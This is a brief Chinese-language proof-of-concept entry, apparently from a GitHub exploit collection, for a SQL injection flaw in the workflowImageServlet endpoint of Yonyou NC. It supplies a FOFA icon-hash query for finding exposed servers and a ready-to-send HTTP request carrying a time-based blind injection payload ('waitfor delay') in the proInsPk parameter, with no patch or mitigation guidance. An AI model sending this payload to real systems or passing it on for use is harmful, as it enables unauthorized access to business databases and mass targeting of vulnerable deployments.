## 用友NC-workflowImageServlet接口存在sql注入漏洞

## fofa
```
icon_hash="1085941792"  
```

## poc
```
GET /portal/pt/servlet/workflowImageServlet/doPost?pageId=login&wfpk=1&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
Host: 192.168.63.129:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19
```

![image](https://github.com/wy876/POC/assets/139549762/558b09c4-0b31-4025-aa2c-61f492690a6c)
